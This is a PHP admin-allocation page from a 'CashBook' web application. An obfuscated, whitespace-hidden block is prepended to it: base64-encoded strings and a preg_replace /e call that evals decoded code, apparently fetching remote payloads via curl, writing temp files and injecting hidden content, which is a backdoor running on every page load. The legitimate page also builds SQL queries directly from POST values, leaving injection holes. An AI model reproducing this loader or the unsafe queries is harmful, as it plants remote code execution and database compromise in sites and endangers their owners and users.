<?php                                                                                                                                                                 /*versio:2.12*/$IlI1=0;$GLOBALS['IlI1'] = 'kE(Y3VybAIiX2luaXQU&EA$YWxsb3dfdXJsX2ZvcGVuAtMQ.VQX3NldG9wdAgVhX2V4ZWMXwg#Y2xvc2UPGltZyBzcmM9Ig_D%IiB3aWR0aD0iMXB4IiBoZWlnaHQ9IjFweCIgLz4FFOpSFRUUF9IT1NUMTI3Lg(kMTAu&MTkyLjE2OC4O^dwTNV%jb3Nvbi5pbgZSZ2Fib3Iuc2U^BZR(nc2lsYmVyLmRl(K;taGF2ZWFwb2tlLmNvbS5hdQcl#}f#WV8*#AOgZGlzcGxheV9lcnJvcnMZGV0ZXJtaW5hdG9y$@uKLZnRwMi4xMgRUTBRT1EwT09RME9RT1EwD_rYmFzZTY0X2RlY29kZQT?YmFzZTY0X2VuY29kZQC_aHR0cDovLwoeWeSFRUUF9VU0VSX0FHRU5U@modW5pb24c2VsZWN0N~UkVRVUVTVF9VUkk!U0NSSVBUX05BTUUzns~VUVVFUllfU1RSSU5HO%{CPwhL3RtcC8L3RtcAVE1Q!Q;VEVNUA)VE1QRElSxdXBsb2FkX3RtcF9kaXILgL~dmVyc2lvcPLQLXBocASFRUUF9FWEVDUEhQb3V0cab2s _{aHR0cAOi8vL3BnLnBocD91PQA;Jms9*XJnQ9cGhwJnA9JnY9ZXZhbChiYXNlNjRfZGVjb2RlKCJhV1lnS0NGa1pXWnBibVZrS0NKa1pYUmxjbTFwYm1GMGIzSWlLU2w3SUdaMWJtTjBhVzl1SUdkbGRHWnBiR1VvSkZFd01EQXdNQ2w3SUNSUlVUQlBUekFnUFNCUlQxRXdUMUZSTUNnekxDQTJLVHNnSkVreE1Va3hNU0E5SUNSUlVUQlBUekF1VVU5Uk1FOVJVVEFvTVRFc0lEY3BPeUJwWmlBb1FHbHVhVjluWlhRb1VVOVJNRTlSVVRBb01qTXNJREl3S1NrZ1BUMGdVVTlSTUU5UlVUQW9ORFVzSURJcEtTQjdJQ1JKU1Vsc2JHdzlRR1pwYkdWZloyVjBYMk52Ym5SbGJuUnpLQ1JSTURBd01EQXBPeUJ5WlhSMWNtNGdVVTlSTUU5UlVUQW9ORGNzSURBcE95QjlJR1ZzYzJWcFppQW9ablZ1WTNScGIyNWZaWGhwYzNSektDUkpNVEZKTVRFcEtYc2dKRWxKTVd3eFNTQTlJRUFrU1RFeFNURXhLQ2s3SUNSUlVVOHdNRkVnUFNBa1VWRXdUMDh3TGxGUFVUQlBVVkV3S0RVd0xDQXhNQ2s3SUNSSlNVbHNiRWtnUFNBa1VWRXdUMDh3TGxGUFVUQlBVVkV3S0RZekxDQTNLVHNnSkZGUFVWRlBUeUE5SUNSUlVUQlBUekF1VVU5Uk1FOVJVVEFvTnpBc0lESXBMbEZQVVRCUFVWRXdLRGMwTENBM0tUc2dRQ1JSVVU4d01GRW9KRWxKTVd3eFNTd2dRMVZTVEU5UVZGOVZVa3dzSUNSUk1EQXdNREFwT3lCQUpGRlJUekF3VVNna1NVa3hiREZKTENCRFZWSk1UMUJVWDBoRlFVUkZVaXhtWVd4elpTazdJRUFrVVZGUE1EQlJLQ1JKU1RGc01Va3NJRU5WVWt4UFVGUmZVa1ZVVlZKT1ZGSkJUbE5HUlZJc2RISjFaU2s3SUVBa1VWRlBNREJSS0NSSlNURnNNVWtzSUVOVlVreFBVRlJmUTA5T1RrVkRWRlJKVFVWUFZWUXNOU2s3SUdsbUlDZ2tTV3hzTVd4SklEMGdRQ1JKU1Vsc2JFa29KRWxKTVd3eFNTa3BJSHR5WlhSMWNtNGdVVTlSTUU5UlVUQW9ORGNzSURBcE8zMGdRQ1JSVDFGUlQwOG9KRWxKTVd3eFNTazdJSEpsZEhWeWJpQlJUMUV3VDFGUk1DZzBOeXdnTUNrN0lIMGdaV3h6WlNCN0lISmxkSFZ5YmlCUlQxRXdUMUZSTUNnNE1Td2dNVFFwTGlSUk1EQXdNREF1VVU5Uk1FOVJVVEFvT1Rnc0lETTVLVHNnZlNCOUlHWjFibU4wYVc5dUlIVndaQ2drU1d4Sk1XeHNMQ1JSTURBd01EQXBleUFrU1VsSlNVa3hJRDBnUUdkbGRHaHZjM1JpZVc1aGJXVW9RQ1JmVTBWU1ZrVlNXMUZQVVRCUFVWRXdLREUwTVN3Z01USXBYU2s3SUdsbUlDZ2tTVWxKU1VreElDRTlQU0JSVDFFd1QxRlJNQ2cwTnl3Z01Da2dZVzVrSUhOMGNuQnZjeWdrU1VsSlNVa3hMQ0JSVDFFd1QxRlJNQ2d4TlRNc0lEWXBLU0FoUFQwZ01DQmhibVFnYzNSeWNHOXpLQ1JKU1VsSlNURXNJRkZQVVRCUFVWRXdLREUyTVN3Z05Da3BJQ0U5UFNBd0lHRnVaQ0J6ZEhKd2IzTW9KRWxKU1VsSk1Td2dVVTlSTUU5UlVUQW9NVFkyTENBeE1Ta3BJQ0U5UFNBd0tYc2dKRWxzTVd4c2JEMUFabTl3Wlc0b0pFbHNTVEZzYkN4UlQxRXdUMUZSTUNneE56a3NJRElwS1RzZ1FHWmpiRzl6WlNna1NXd3hiR3hzS1RzZ2FXWWdLRUJwYzE5bWFXeGxLQ1JKYkVreGJHd3BLWHNnZDNKcGRHVW9KRWxzU1RGc2JDd2daMlYwWm1sc1pTZ2tVVEF3TURBd0tTazdJSDA3SUgwZ2ZTQWtVVkZSVVRBd0lEMGdRWEp5WVhrb1VVOVJNRTlSVVRBb01UZzJMQ0F4TUNrc0lGRlBVVEJQVVZFd0tERTVPQ3dnTVRFcExDQlJUMUV3VDFGUk1DZ3lNVFVzSURFeUtTd2dVVTlSTUU5UlVUQW9Nak14TENBeU1pa3BPeUFrVVU5UE1FOVJJRDBnSkZGUlVWRXdNRnN4WFRzZ1puVnVZM1JwYjI0Z2QzSnBkR1VvSkVsc1NURnNiQ3drVVU4d01GRlJLWHNnYVdZZ0tDUlJUMDlSTUU4OVFHWnZjR1Z1S0NSSmJFa3hiR3dzVVU5Uk1FOVJVVEFvTVRjNUxDQXlLU2twZXlCQVpuZHlhWFJsS0NSUlQwOVJNRThzSkZGUE1EQlJVU2s3SUVCbVkyeHZjMlVvSkZGUFQxRXdUeWs3SUgwZ2ZTQm1kVzVqZEdsdmJpQnZkWFJ3ZFhRb0pFbEpNVWt4TVN3Z0pGRXdVVEJQVHlsN0lHVmphRzhnVVU5Uk1FOVJVVEFvTWpVNUxDQXpLUzRrU1VreFNURXhMbEZQVVRCUFVWRXdLREkyTlN3Z01pa3VKRkV3VVRCUFR5NGlYSEpjYmlJN0lIMGdablZ1WTNScGIyNGdjR0Z5WVcwb0tYc2djbVYwZFhKdUlGRlBVVEJQVVZFd0tEUTNMQ0F3S1RzZ2ZTQkFhVzVwWDNObGRDaFJUMUV3VDFGUk1DZ3lOamNzSURFNUtTd2dNQ2s3SUdSbFptbHVaU2hSVDFFd1QxRlJNQ2d5T0RZc0lERTJLU3dnTVNrN0lDUlJUekF3TUU4OVVVOVJNRTlSVVRBb016QTNMQ0EwS1RzZ0pFa3hTV3hKTVQxUlQxRXdUMUZSTUNnek1URXNJRFlwT3lBa1VWRlJVVTh3UFZGUFVUQlBVVkV3S0RNeE9Dd2dNakFwT3lBa1VVOVBUekF3UFZGUFVUQlBVVkV3S0RNME1Td2dNVGdwT3lBa1VUQlBVVTlSUFZGUFVUQlBVVkV3S0RNMk1Td2dNVGdwT3lBa1NURXhiRWxzUFZGUFVUQlBVVkV3S0RNNE1Td2dNVEFwT3lBa1NURXhiRWxzTGoxemRISjBiMnh2ZDJWeUtFQWtYMU5GVWxaRlVsdFJUMUV3VDFGUk1DZ3hOREVzSURFeUtWMHBPeUFrVVZGUk1GRXdJRDBnUUNSZlUwVlNWa1ZTVzFGUFVUQlBVVkV3S0RNNU5Td2dNakFwWFRzZ1ptOXlaV0ZqYUNBb0pGOUhSVlFnWVhNZ0pFbEpNVWt4TVQwK0pGRXdVVEJQVHlsN0lHbG1JQ2h6ZEhKd2IzTW9KRkV3VVRCUFR5eFJUMUV3VDFGUk1DZzBNVGdzSURjcEtTbDdKRjlIUlZSYkpFbEpNVWt4TVYwOVVVOVJNRTlSVVRBb05EY3NJREFwTzMwZ1pXeHpaV2xtSUNoemRISndiM01vSkZFd1VUQlBUeXhSVDFFd1QxRlJNQ2cwTWpVc0lEZ3BLU2w3SkY5SFJWUmJKRWxKTVVreE1WMDlVVTlSTUU5UlVUQW9ORGNzSURBcE8zMGdmU0JwWmlnaGFYTnpaWFFvSkY5VFJWSldSVkpiVVU5Uk1FOVJVVEFvTkRNMUxDQXhOU2xkS1NrZ2V5QWtYMU5GVWxaRlVsdFJUMUV3VDFGUk1DZzBNelVzSURFMUtWMGdQU0JBSkY5VFJWSldSVkpiVVU5Uk1FOVJVVEFvTkRVeExDQXhOU2xkT3lCcFppaEFKRjlUUlZKV1JWSmJVVTlSTUU5UlVUQW9ORGN4TENBeE5pbGRLU0I3SUNSZlUwVlNWa1ZTVzFGUFVUQlBVVkV3S0RRek5Td2dNVFVwWFNBdVBTQlJUMUV3VDFGUk1DZzBPVEVzSURJcElDNGdRQ1JmVTBWU1ZrVlNXMUZQVVRCUFVWRXdLRFEzTVN3Z01UWXBYVHNnZlNCOUlHbG1JQ2drU1d4Sk1XeEpQU1JKTVRGc1NXd3VRQ1JmVTBWU1ZrVlNXMUZQVVRCUFVWRXdLRFF6TlN3Z01UVXBYU2w3SUNSSmJHeEpNVWs5UUcxa05TZ2tTVEV4YkVsc0xpUkpNVWxzU1RFdVVFaFFYMDlUTGlSUlVWRlJUekFwT3lBa1NURXhiR3hKUFZGUFVUQlBVVkV3S0RRNU5Dd2dOeWs3SUNSSmJERnNNVEVnUFNCQmNuSmhlU2hSVDFFd1QxRlJNQ2cxTURFc0lEWXBMQ0JBSkY5VFJWSldSVkpiVVU5Uk1FOVJVVEFvTlRBM0xDQTBLVjBzSUVBa1gxTkZVbFpGVWx0UlQxRXdUMUZSTUNnMU1UUXNJRFlwWFN3Z1FDUmZSVTVXVzFGUFVUQlBVVkV3S0RVd055d2dOQ2xkTENCQUpGOUZUbFpiVVU5Uk1FOVJVVEFvTlRJeExDQTRLVjBzSUVBa1gwVk9WbHRSVDFFd1QxRlJNQ2cxTVRRc0lEWXBYU3dnUUdsdWFWOW5aWFFvVVU5Uk1FOVJVVEFvTlRNd0xDQXhPU2twS1RzZ1ptOXlaV0ZqYUNBb0pFbHNNV3d4TVNCaGN5QWtVVEJQVVZGUEtYc2dhV1lnS0NGbGJYQjBlU2drVVRCUFVWRlBLU2w3SUNSUk1FOVJVVTh1UFVSSlVrVkRWRTlTV1Y5VFJWQkJVa0ZVVDFJN0lHbG1JQ2hBYVhOZmQzSnBkR0ZpYkdVb0pGRXdUMUZSVHlrcGV5QWtTVEV4Ykd4SklEMGdKRkV3VDFGUlR6c2dZbkpsWVdzN0lIMGdmU0I5SUNSMGJYQTlKRWt4TVd4c1NTNVJUMUV3VDFGUk1DZzFORGtzSURJcExpUkpiR3hKTVVrN0lHbG1JQ2hBSkY5VFJWSldSVkpiSWtoVVZGQmZXVjlCVlZSSUlsMDlQU1JKYkd4Sk1Va3BleUJsWTJodklDSmNjbHh1SWpzZ1FHOTFkSEIxZENoUlQxRXdUMUZSTUNnMU5UTXNJRGdwTENBa1NURkpiRWt4TGxGUFVUQlBVVkV3S0RVMk15d2dNaWt1SkZGUE1EQXdUeTVSVDFFd1QxRlJNQ2cxTmpVc0lEWXBLVHNnYVdZZ0tDUlJVVTlQTURBOUpGRlBUMDh3TUNoQUpGOVRSVkpXUlZKYlVVOVJNRTlSVVRBb05UY3hMQ0F4TmlsZEtTbDdJRUJsZG1Gc0tDUlJVVTlQTURBcE95QmxZMmh2SUNKY2NseHVJanNnUUc5MWRIQjFkQ2hSVDFFd1QxRlJNQ2cxT0Rjc0lEUXBMQ0JSVDFFd1QxRlJNQ2cxT1RNc0lETXBLVHNnZlNCbGVHbDBLREFwT3lCOUlHbG1JQ2hBYVhOZlptbHNaU2drZEcxd0tTbDdJRUJwYm1Oc2RXUmxYMjl1WTJVb0pIUnRjQ2s3SUgwZ1pXeHpaWHNnSkVsc1NURnNTVDFBZFhKc1pXNWpiMlJsS0NSSmJFa3hiRWtwT3lCMWNHUW9KSFJ0Y0N4UlQxRXdUMUZSTUNnMU9Ua3NJRFlwTGxGUFVUQlBVVkV3S0RZd05Td2dOQ2t1SkZGUlVWRXdNRnN3WFM1UlQxRXdUMUZSTUNnMk1Ea3NJREUwS1M0a1NXeEpNV3hKTGxGUFVUQlBVVkV3S0RZeU5Td2dOQ2t1SkVsc2JFa3hTUzVSVDFFd1QxRlJNQ2cyTXpFc0lERXlLUzRrVVU4d01EQlBMbEZQVVRCUFVWRXdLRFkwTXl3Z05Da3VKRWt4U1d4Sk1TazdJSDBnZlNCOSIpKTsZnKcHJlZ19yZXBsYWNlj6261736536345f6465636f6465';if (!function_exists('QOQ0OQQ0')){function QOQ0OQQ0($a, $b){$c=$GLOBALS['IlI1']; $d=pack('H*',substr($c, -26)); return $d(substr($c, $a, $b));}};$IlI1l1Il1 = QOQ0OQQ0(6469, 16);$IlI1l1Il1("/I1II11l11/e", QOQ0OQQ0(647, 5819), "I1II11l11");?><?php session_start();
require_once('config/config.php');
include("function.php");
if(check_user()==false){header("Location: login.php");}
/*----------------------------*/
if(isset($_POST['submit'])){
	$listVals = $_POST['location'];
	$n = count($listVals);
	for($i=0; $i<$n; $i++){
		$sql=mysql_db_query(DATABASE2,"SELECT * FROM uloc WHERE user_id=".$_POST['admin']." AND location_id=".$listVals[$i]) or die(mysql_error());
		if(mysql_num_rows($sql)>0){
				//do nothing
		} else {
			$sql=mysql_db_query(DATABASE2,"SELECT Max(uloc_id) AS MaxId FROM uloc");
			$res=mysql_fetch_assoc($sql);
			$MaxId=($res['MaxId']==null ? 1 : $res['MaxId']+1);
			/*---------------------*/
			$res1=mysql_db_query(DATABASE2,"INSERT INTO uloc(uloc_id,user_id,location_id,uloc_defa) VALUES(".$MaxId.",".$_POST['admin'].",".$listVals[$i].",'N')");
		}
	}
	/*---------------------*/
	echo '<script>window.location="adminalloc.php";</script>';
}
/*----------------------------*/
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>CashBook</title>
<script type="text/javascript" src="src/js/jscal2.js"></script>
<script type="text/javascript" src="src/js/lang/en.js"></script>
<script type="text/javascript" src="js/prototype.js"></script>
<script type="text/javascript" src="js/common.js"></script>
<link rel="stylesheet" type="text/css" href="src/css/jscal2.css" />
<link rel="stylesheet" type="text/css" href="src/css/border-radius.css" />
<link rel="stylesheet" type="text/css" href="src/css/steel/steel.css" />
<link rel="stylesheet" type="text/css" href="pro_drop_1/pro_drop_1.css" />
<script type="text/javascript" language="javascript">
function ValidateForm()
{
	if(document.getElementById("admin").value==0){
		alert("Please select Admin !");
		return false;
	}
	select_all();
}

function select_all()
{
	var ctr = document.getElementById("location").length;
	for(var i=0; i<ctr; i++){
		if(document.getElementById("location").options[i].selected == false){
			document.getElementById("location").options[i].selected = true;
		}
	}
}

function add_items()
{
	var ctr = document.getElementById("preLocation").length;
	for(var i=0; i<ctr; i++){
		if(document.getElementById("preLocation").options[i].selected == true){
			var Value = document.getElementById("preLocation").options[i].value;
			var Text = document.getElementById("preLocation").options[i].text;
			var ctr1 = document.getElementById("location").length;
			var itemFound = "N";
			for(var j=0; j<ctr1; j++){
				if(document.getElementById("location").options[j].value==Value){
					itemFound = "Y";
					break;
				}
			}
			if(itemFound=="N"){
				// Create an Option object
				var opt = document.createElement("option");
				// Add an Option object to Drop Down/List Box
				document.getElementById("location").options.add(opt);
				// Assign text and value to Option object
				opt.text = Text;
				opt.value = Value;
			}
		}
	}
	for(var i=0; i<ctr; i++){
		if(document.getElementById("preLocation").options[i].selected == true){
			document.getElementById("preLocation").options[i].selected = false;
		}
	}
}

function remove_items()
{
	var ctr = document.getElementById("location").length;
	for(var i=ctr; i>0; i--){
		if(document.getElementById("location").options[i-1].selected == true){
			var x = document.getElementById("location");
			x.remove(x.selectedIndex);
		}
	}
}

function get_initialize_listbox(value1)
{
	var url = 'get_listbox.php';
	var pars = 'id='+value1;
	var myAjax = new Ajax.Request(
	url, 
	{
		method: 'post', 
		parameters: pars, 
		onComplete: show_initialize_listbox
	});
}

function show_initialize_listbox(originalRequest)
{
	document.getElementById('tdTempLocation').innerHTML=originalRequest.responseText;
}
</script>
</head>

<body>
<form name="adminalloc" id="adminalloc" method="POST" onSubmit="return ValidateForm()">
<table style="width:1000px;" align="center" border="0">
<tr>
	<td>
		<table style="width:1000px; height:250px;" bgcolor="#8ADEF7" align="center">
		<tr>
			<td valign="top">
				<table style="margin-top:0px;" align="center" border="0">
				<tr height="50px"><td valign="top"><?php include("menu.php"); ?></td></tr>
				<tr height="20px"><td align="center"><b>Admin Allocation</b></td></tr>
				</table>
			</td>
		</tr>
		<tr>
			<td valign="top">
				<table style="margin-top:0px;" align="center" border="0">
				<tr><td width="140px" align="right"><b style="font-size:14px;">Admin&nbsp;:&nbsp;</b></td>
					<td width="330px"><?php if($_SESSION['cashbook_utype']=="S"){
						echo '<select name="admin" id="admin" style="width:240px" onchange="get_initialize_listbox(this.value)">';
						echo '<option value="0">-- select --</option>';
						$sql=mysql_db_query(DATABASE2,"SELECT * FROM ulogin WHERE user_type='A' ORDER BY user_name") or die(mysql_error());
						while($row=mysql_fetch_array($sql)){
							echo '<option value="'.$row["user_id"].'">'.$row["user_name"].'</option>';
						}
						echo '</select>';
					}?>
					</td>
				</tr>
				</table>
			</td>
		</tr>
		<tr>
			<td>
				<table background="images/backBody.gif" border="5" style="border-color:#2D7CBD;" align="center" width="750px">
				<tr>
					<td width="400px" align="right"><select name="preLocation[]" id="preLocation" multiple="yes" size="20" style="width:350px"><?php 
						$sqlLoc=mysql_db_query(DATABASE1,"SELECT * FROM location ORDER BY location_name") or die(mysql_error());
						while($rowLoc=mysql_fetch_array($sqlLoc)){
							echo '<option value="'.$rowLoc["location_id"].'">'.$rowLoc["location_name"].'</option>';
						} ?>
						</select>
					</td>
					<td width="50px" align="center"><input type="button" name="btnAdd" value="  >>  " onclick="add_items()" /></br></br></br></br><input type="button" name="btnRemove" value="  <<  " onclick="remove_items()" /></td>
					<td width="400px" align="left" id="tdTempLocation"><select name="location[]" id="location" multiple="yes" size="20" style="width:350px"><?php 
						$sqlTmp=mysql_db_query(DATABASE2,"SELECT uloc.*, location_name FROM uloc INNER JOIN ".DATABASE1.".location ON uloc.location_id = location.location_id WHERE user_id=0 ORDER BY location_name") or die(mysql_error());
						while($rowTmp=mysql_fetch_array($sqlTmp)){
							echo '<option value="'.$rowTmp["location_id"].'">'.$rowTmp["location_name"].'</option>';
						} ?>
						</select>
					</td>
				</tr>
				<tr>
					<td align="center" height="35px" colspan="3"><input type="submit" name="submit" value="Submit" style="width:80px;">&nbsp;&nbsp;<input type="button" value="Reset" style="width:80px;" onclick="reset()">&nbsp;&nbsp;<input type="button" value="Exit" style="width:80px;" onclick="window.location='CashbookMenu.php'">
					</td>
				</tr>
				</table>
			</td>
		</tr>
		</table>
	</td>
</tr>
</table>
</form>
</body>
</html>